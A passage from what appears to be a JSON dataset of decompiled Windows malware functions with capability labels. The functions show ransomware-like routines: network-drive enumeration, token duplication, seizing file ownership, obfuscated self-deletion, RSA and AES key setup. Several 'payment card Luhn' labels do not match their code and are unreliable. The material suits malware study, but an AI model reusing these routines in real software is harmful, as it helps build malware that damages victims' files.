    },
    "0040fae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fae0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t lpRootPathName;\n    uint var_18h;\n    uint var_14h;\n    uint DuplicateTokenHandle;\n    uint ExistingTokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uVar4 = 0x1a;\n    lpRootPathName = *0x41da08;\n    var_18h._0_2_ = *0x41da0c;\n    do {\n        uVar4 = uVar4 - 1;\n        if ((*(&var_4h + (uVar4 >> 3)) >> (uVar4 & 7) & 1) != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&lpRootPathName);\n            if (iVar1 == 4) {\n                var_8h = 0x200;\n                puVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x404);\n                iVar1 = (*_sym.imp.MPR.dll_WNetGetConnectionW)(&lpRootPathName, puVar2 + 1, &var_8h);\n                if (iVar1 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_PathRemoveBackslashW)(puVar2 + 1);\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenThreadToken)(0xfffffffe, 10, 1, &ExistingTokenHandle);\n                    if (iVar1 == 0) {\n                        uVar3 = 0xffffffff;\n                    }\n                    else {\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 2, &DuplicateTokenHandle);\n                        uVar3 = 0xffffffff;\n                        if (iVar1 != 0) {\n                            uVar3 = DuplicateTokenHandle;\n                        }\n                    }\n                    *puVar2 = uVar3;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040fd80, puVar2, 0, &var_14h);\n                    *(*0x428408 * 4 + 0x426960) = uVar3;\n                    LOCK();\n                    *0x428408 = *0x428408 + 1;\n                }\n                else {\n                    (*_sym.imp.msvcrt.dll_free)(puVar2);\n                }\n            }\n        }\n        lpRootPathName = lpRootPathName & 0xffff0000 | lpRootPathName - 1;\n    } while (uVar4 != 0);\n    fcn.0040fbf0();\n    return;\n}\n",
        "token_count": 630
    },
    "004123d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004123d0(uint16_t *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint16_t *puVar9;\n    uint32_t uVar10;\n    uint16_t **ppuVar11;\n    bool bVar12;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    (*_sym.imp.gdiplus.dll_GdipGetImageEncodersSize)(&var_4h, &var_8h);\n    if (var_8h == 0) {\n        return 0xffffffff;\n    }\n    iVar6 = (*_sym.imp.msvcrt.dll_malloc)(var_8h);\n    if (iVar6 == 0) {\n        return 0xffffffff;\n    }\n    (*_sym.imp.gdiplus.dll_GdipGetImageEncoders)(var_4h, var_8h, iVar6);\n    uVar10 = 0;\n    if (var_4h != 0) {\n        ppuVar11 = iVar6 + 0x30;\n        do {\n            puVar9 = *ppuVar11;\n            puVar7 = param_1;\n            do {\n                uVar2 = *puVar9;\n                bVar12 = uVar2 < *puVar7;\n                if (uVar2 != *puVar7) {\ncode_r0x00412466:\n                    uVar8 = -bVar12 | 1;\n                    goto code_r0x0041246b;\n                }\n                if (uVar2 == 0) break;\n                uVar2 = puVar9[1];\n                bVar12 = uVar2 < puVar7[1];\n                if (uVar2 != puVar7[1]) goto code_r0x00412466;\n                puVar9 = puVar9 + 2;\n                puVar7 = puVar7 + 2;\n            } while (uVar2 != 0);\n            uVar8 = 0;\ncode_r0x0041246b:\n            if (uVar8 == 0) {\n                puVar1 = uVar10 * 0x4c + iVar6;\n                uVar3 = puVar1[1];\n                uVar4 = puVar1[2];\n                uVar5 = puVar1[3];\n                *param_2 = *puVar1;\n                param_2[1] = uVar3;\n                param_2[2] = uVar4;\n                param_2[3] = uVar5;\n                (*_sym.imp.msvcrt.dll_free)(iVar6);\n                return uVar10;\n            }\n            uVar10 = uVar10 + 1;\n            ppuVar11 = ppuVar11 + 0x13;\n        } while (uVar10 < var_4h);\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar6);\n    return 0xffffffff;\n}\n",
        "token_count": 722
    },
    "004127a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004127a0(uint param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint pSecurityDescriptor;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar4 = 0;\n    var_8h = 0;\n    var_ch = param_1;\n    (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_4h);\n    puVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x200);\n    if (puVar2 != NULL) {\n        iVar3 = (*_sym.imp.ntdll.dll_NtQueryInformationToken)(var_4h, 1, puVar2, 0x200, &var_8h);\n        if (iVar3 == 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorOwner)(&pSecurityDescriptor, *puVar2, 0);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetFileSecurityW;\n                if (iVar3 != 0) {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 1, &pSecurityDescriptor);\n                    if (iVar3 != 0) {\n                        iVar3 = (*pcVar1)(var_ch, 4, &pSecurityDescriptor);\n                        if (iVar3 != 0) {\n                            uVar4 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_4h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n    }\n    if (puVar2 != NULL) {\n        (*_sym.imp.msvcrt.dll_free)(puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 461
    },
    "00416ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "create process on Windows",
            "delete file/1476a0a7391548a685f053c74cc3e8cf",
            "delete file",
            "move file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00416ce0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint ARG_0;\n    uint var_1fah;\n    uint pExecInfo;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint var_10h;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x30);\n    uVar3 = *(*(iVar1 + 0x10) + 0x3c);\n    uVar4 = uVar3;\n    fcn.004024c0(param_1);\n    uVar2 = fcn.00401c90();\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar2);\n    (*_sym.imp.KERNEL32.dll_MoveFileExW)(*(*(iVar1 + 0x10) + 0x3c), 0, 4, uVar3, uVar4);\n    pExecInfo = 0x3c;\n    var_10h._0_2_ = str.Removed_autorun_key._0_4_ ^ 0x3e;\n    var_60h = 0x400;\n    var_10h._2_2_ = str.Removed_autorun_key._0_4_ >> 0x10 ^ 0x3e;\n    var_5ch = 0;\n    var_ch = str.Removed_autorun_key._4_4_ ^ 0x3e;\n    var_58h = 0;\n    var_ah = str.Removed_autorun_key._4_4_ >> 0x10 ^ 0x3e;\n    var_22h = 0x5d003e;\n    var_8h = str.Removed_autorun_key._8_4_ ^ 0x3e;\n    var_1eh = 0x5a0053;\n    var_6h = str.Removed_autorun_key._8_4_ >> 0x10 ^ 0x3e;\n    var_1ah = 0x5b0010;\n    var_4h = str.Removed_autorun_key._12_4_ ^ 0x3e;\n    var_16h = 0x5b0046;\n    var_12h = 0x3e;\n    var_2h = 0;\n    var_54h = fcn.00401ce0();\n    var_50h = &ARG_0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_44h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 761
    },
    "00418c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00418c90(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_18h;\n    uint32_t uVar2;\n    uint var_3d8h;\n    uint var_1d0h;\n    uint var_90h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint32_t *var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = param_2;\n    fcn.0040b4e0(&var_1ch);\n    fcn.0040b4e0(&var_28h);\n    fcn.0040d7d0(0x428330, 0, 0);\n    iVar1 = fcn.0040c0e0(&var_1ch, 0x426000, 0x100);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040c0e0(&var_28h, 0x426100, 3);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040d720(0x428330, &var_1ch, 0, 0, 0, &var_28h);\n            if (iVar1 == 0) {\n                fcn.004086f0(&var_1d0h);\n                fcn.00408390(&var_3d8h);\n                fcn.00412920(&var_90h, 100);\n                iVar1 = fcn.004088f0(&var_1d0h, fcn.00408260, &var_3d8h, &var_90h, 100);\n                if (iVar1 == 0) {\n                    var_4h = *param_2;\n                    uVar2 = 0;\n                    arg_18h = 0xf5;\n                    var_8h = 0;\n                    if (var_4h / 0xf5 != -1) {\n                        do {\n                            iVar1 = fcn.0040d800(0x428330, fcn.00408710, &var_1d0h, 0, arg_18h, param_1, \n                                                 uVar2 + 0x427aa0);\n                            if (iVar1 != 0) goto code_r0x00418e13;\n                            if (var_4h < 0xf5) {\n                                arg_18h = var_4h;\n                            }\n                            var_4h = var_4h - 0xf5;\n                            var_8h = var_8h + 1;\n                            param_1 = param_1 + 0xf5;\n                            uVar2 = uVar2 + 0x100;\n                        } while (var_8h != *var_ch / 0xf5 + 1);\n                    }\n                    var_10h = 1;\n                    *var_ch = uVar2;\n                }\n            }\n        }\n    }\ncode_r0x00418e13:\n    fcn.0040add0(&var_1ch);\n    fcn.0040add0(&var_28h);\n    fcn.0040d3a0(0x428330);\n    fcn.004086c0(&var_1d0h);\n    fcn.00408220(&var_3d8h);\n    return var_10h;\n}\n",
        "token_count": 782
    },
    "00418e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00418e60(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_490h;\n    uint var_288h;\n    uint var_148h;\n    uint var_94h;\n    uint var_60h;\n    uint var_54h;\n    uint var_48h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    \n    uVar2 = 0;\n    fcn.004086f0(&var_288h);\n    fcn.0040d7d0(&var_148h, 0, 0);\n    fcn.0040b4e0(&var_ch);\n    fcn.0040b4e0(&var_18h);\n    fcn.0040b4e0(&var_24h);\n    fcn.0040b4e0(&var_30h);\n    fcn.0040b4e0(&var_3ch);\n    fcn.0040b4e0(&var_48h);\n    fcn.0040b4e0(&var_54h);\n    fcn.0040b4e0(&var_60h);\n    fcn.00412920(&var_94h, 0x32);\n    fcn.00408390(&var_490h);\n    iVar1 = fcn.004088f0(&var_288h, fcn.00408260, &var_490h, &var_94h, 0x32);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040d440(&var_148h, fcn.00408710, &var_288h, 0x800, 0x10001);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040d1d0(&var_148h, &var_ch, &var_18h, &var_24h, &var_30h, &var_3ch);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0040d2d0(&var_148h, &var_48h, &var_54h, &var_60h);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0040c5f0(&var_ch, *param_1, 0x100);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0040c5f0(&var_3ch, *param_1 + 0x100, 3);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0040c5f0(&var_30h, *param_1 + 0x103, 0x100);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0040c5f0(&var_18h, *param_1 + 0x203, 0x80);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0040c5f0(&var_24h, *param_1 + 0x283, 0x80);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.0040c5f0(&var_48h, *param_1 + 0x303, 0x80);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.0040c5f0(&var_54h, *param_1 + 899, 0x80);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.0040c5f0(&var_60h, *param_1 + 0x403, 0x80);\n                                                if (iVar1 == 0) {\n                                                    uVar2 = 1;\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.0040add0(&var_ch);\n    fcn.0040add0(&var_18h);\n    fcn.0040add0(&var_24h);\n    fcn.0040add0(&var_30h);\n    fcn.0040add0(&var_3ch);\n    fcn.0040add0(&var_48h);\n    fcn.0040add0(&var_54h);\n    fcn.0040add0(&var_60h);\n    fcn.0040d3a0(&var_148h);\n    fcn.004086c0(&var_288h);\n    fcn.00408220(&var_490h);\n    return uVar2;\n}\n",
        "token_count": 1056
    },
    "00419bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00419bd0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack62;\n    uint uStack58;\n    int16_t iStack54;\n    uint32_t uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    ushort uStack32;\n    \n    pcVar2 = _sym.imp.ntdll.dll_RtlInterlockedPopEntrySList;\n    LOCK();\n    *0x428434 = *0x428434 + 1;\n    pcVar1 = _sym.imp.ntdll.dll_RtlLeaveCriticalSection;\n    do {\n        (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)(0x4283dc);\n        do {\n            if (*0x428438 < 1) {\n                (*pcVar1)(0x4283dc);\n                LOCK();\n                *0x428434 = *0x428434 + -1;\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            *0x428438 = *0x428438 + -1;\n            iVar4 = (*pcVar2)(*0x42822c);\n        } while (iVar4 == 0);\n        uStack52 = *(iVar4 + 4);\n        uStack48 = *(iVar4 + 8);\n        uStack44 = *(iVar4 + 0xc);\n        uStack40 = *(iVar4 + 0x10);\n        uStack36 = *(iVar4 + 0x14);\n        uStack32 = *(iVar4 + 0x18);\n        (*_sym.imp.msvcrt.dll_free)(iVar4);\n        (*pcVar1)(0x4283dc);\n        cVar3 = fcn.0041a330();\n        if ((cVar3 != '\\0') || (cVar3 = fcn.0041a330(),  cVar3 != '\\0')) {\n            uVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x3c);\n            uStack62 = 0x250039;\n            uStack58 = 0x53;\n            iStack54 = *0x4238ca;\n            uStack52 = str.08:15:15._0_4_;\n            (*_sym.imp.USER32.dll_wsprintfW)(uVar5, &uStack62 + 2, &uStack48);\n            fcn.00419d30();\n            pcVar1 = _sym.imp.ntdll.dll_RtlLeaveCriticalSection;\n        }\n    } while( true );\n}\n",
        "token_count": 588
    },
    "00401320": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401320(uint8_t *param_1)\n\n{\n    *(param_1 + 2) = param_1[2] ^ *param_1;\n    *(param_1 + 4) = param_1[4] ^ *param_1;\n    *(param_1 + 6) = param_1[6] ^ *param_1;\n    *(param_1 + 8) = param_1[8] ^ *param_1;\n    *(param_1 + 10) = param_1[10] ^ *param_1;\n    *(param_1 + 0xc) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 156
    },
    "00412920": {
        "rules": [
            "contain obfuscated stackstrings",
            "link function at runtime on Windows",
            "create new key via CryptAcquireContext",
            "generate random numbers via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00412920(uint pbBuffer, uint dwLen)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint lpProcName;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint lpLibFileName;\n    uint var_ch;\n    ushort var_8h;\n    uint var_6h;\n    \n    var_78h = 0x69004d;\n    var_24h._0_2_ = 0;\n    var_6h._0_1_ = 0;\n    var_74h = 0x720063;\n    var_70h = 0x73006f;\n    var_6ch = 0x66006f;\n    var_68h = 0x200074;\n    var_64h = 0x610042;\n    var_60h = 0x650073;\n    var_5ch = 0x430020;\n    var_58h = 0x790072;\n    var_54h = 0x740070;\n    var_50h = 0x67006f;\n    var_4ch = 0x610072;\n    var_48h = 0x680070;\n    var_44h = 0x630069;\n    var_40h = 0x500020;\n    var_3ch = 0x6f0072;\n    var_38h = 0x690076;\n    var_34h = 0x650064;\n    var_30h = 0x200072;\n    var_2ch = 0x310076;\n    var_28h = 0x30002e;\n    lpLibFileName = 0x79726362;\n    var_ch = 0x642e7470;\n    var_8h = 0x6c6c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&var_6h + 2, 0, &var_78h, 1, 0xf0000000);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    else {\n        lpProcName = str.BCryptGenRandom._0_4_;\n        uStack32 = str.BCryptGenRandom._4_4_;\n        uStack28 = str.BCryptGenRandom._8_4_;\n        uStack24 = str.BCryptGenRandom._12_4_;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, &lpProcName);\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, pbBuffer, dwLen, 2);\n            return 1;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&var_6h + 2, 0, &var_78h, 1, 0xf0000000);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(stack0xfffffff8, dwLen, pbBuffer);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(stack0xfffffff8, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 935
    },
    "00412590": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412590(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(param_1);\n    return;\n}\n",
        "token_count": 36
    },
    "00412870": {
        "rules": [
            "check mutex",
            "create mutex"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nuint fcn.00412870(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_5eh;\n    uint var_4eh;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_36h;\n    uint var_2fh;\n    uint var_1fh;\n    uint var_fh;\n    uint var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    fcn.00401370();\n    uVar1 = fcn.00401370();\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, uVar1);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, uVar1);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 204
    },
    "004176f0": {
        "rules": [
            "open process"
        ],
        "decompiled_code": "\nuint fcn.004176f0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpdwProcessId;\n    uint DuplicateTokenHandle;\n    uint ExistingTokenHandle;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetShellWindow)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, &lpdwProcessId);\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1000, 0, lpdwProcessId);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar2, 10, &ExistingTokenHandle);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 2, &DuplicateTokenHandle);\n            if (iVar3 != 0) {\n                (*_sym.imp.ADVAPI32.dll_SetThreadToken)(0, DuplicateTokenHandle);\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(DuplicateTokenHandle);\n                (*pcVar1)(ExistingTokenHandle);\n                (*pcVar1)(iVar2);\n                return 1;\n            }\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ExistingTokenHandle);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 352
    },
    "0040f370": {
        "rules": [
            "encrypt data using AES via x86 extensions"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f591)\n// WARNING: Removing unreachable block (ram,0x0040f585)\n// WARNING: Removing unreachable block (ram,0x0040f572)\n// WARNING: Removing unreachable block (ram,0x0040f557)\n// WARNING: Removing unreachable block (ram,0x0040f54b)\n// WARNING: Removing unreachable block (ram,0x0040f538)\n// WARNING: Removing unreachable block (ram,0x0040f51d)\n// WARNING: Removing unreachable block (ram,0x0040f511)\n// WARNING: Removing unreachable block (ram,0x0040f501)\n// WARNING: Removing unreachable block (ram,0x0040f4e6)\n// WARNING: Removing unreachable block (ram,0x0040f4da)\n// WARNING: Removing unreachable block (ram,0x0040f4ce)\n// WARNING: Removing unreachable block (ram,0x0040f4af)\n// WARNING: Removing unreachable block (ram,0x0040f4a3)\n// WARNING: Removing unreachable block (ram,0x0040f493)\n// WARNING: Removing unreachable block (ram,0x0040f478)\n// WARNING: Removing unreachable block (ram,0x0040f46c)\n// WARNING: Removing unreachable block (ram,0x0040f45c)\n// WARNING: Removing unreachable block (ram,0x0040f441)\n// WARNING: Removing unreachable block (ram,0x0040f435)\n// WARNING: Removing unreachable block (ram,0x0040f425)\n// WARNING: Removing unreachable block (ram,0x0040f40a)\n// WARNING: Removing unreachable block (ram,0x0040f3fe)\n// WARNING: Removing unreachable block (ram,0x0040f3ee)\n// WARNING: Removing unreachable block (ram,0x0040f3d3)\n// WARNING: Removing unreachable block (ram,0x0040f3c7)\n// WARNING: Removing unreachable block (ram,0x0040f3b7)\n// WARNING: Removing unreachable block (ram,0x0040f39c)\n// WARNING: Removing unreachable block (ram,0x0040f390)\n// WARNING: Removing unreachable block (ram,0x0040f381)\n\nvoid __fastcall fcn.0040f370(uchar (*param_1) [16], uchar (*param_2) [16])\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint uVar3;\n    \n    auVar2 = *param_2;\n    auVar1 = aeskeygenassist(auVar2, 1);\n    uVar3 = SUB164(auVar1 >> 0x60, 0);\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    *param_1 = auVar2;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 2);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[1] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 4);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[2] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 8);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[3] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x10);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[4] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x20);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[5] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    param_1[6] = auVar1;\n    auVar2 = aeskeygenassist(auVar1, 0x40);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, 